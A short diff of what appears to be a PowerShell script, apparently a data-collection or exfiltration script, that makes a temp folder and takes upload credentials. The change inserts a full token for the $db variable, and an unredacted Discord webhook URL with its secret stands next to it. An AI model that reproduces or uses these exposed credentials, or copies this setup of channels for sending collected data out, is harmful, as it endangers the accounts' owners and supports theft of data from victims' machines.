@@ -51,7 +51,7 @@ New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
 # Enter your access tokens below. At least one has to be provided but both can be used at the same time. 
 
-#$db = ""
+#$db = "sl.B8jzmzM9gj4CGaSpg3GWH7GZceh8VekHiQ8QhMpHG_GQbTYPK__-PdYidvhIITV8GPgU6VkjlJtI9-v673uOoKXNkVitTUHYDd68Kc4QPMJmMgeh-BLw-G2Y8-ZdefBCXK1blY8oeDkVVRk"
 
 #$dc = "https://discord.com/api/webhooks/1282321834141814815/_4S8cyHuWdKO9OgNfpSKaAtRiysv1MkcKquadvd_f__UWU-cC_RnQo9l9AhKwCsq5LDM"
 
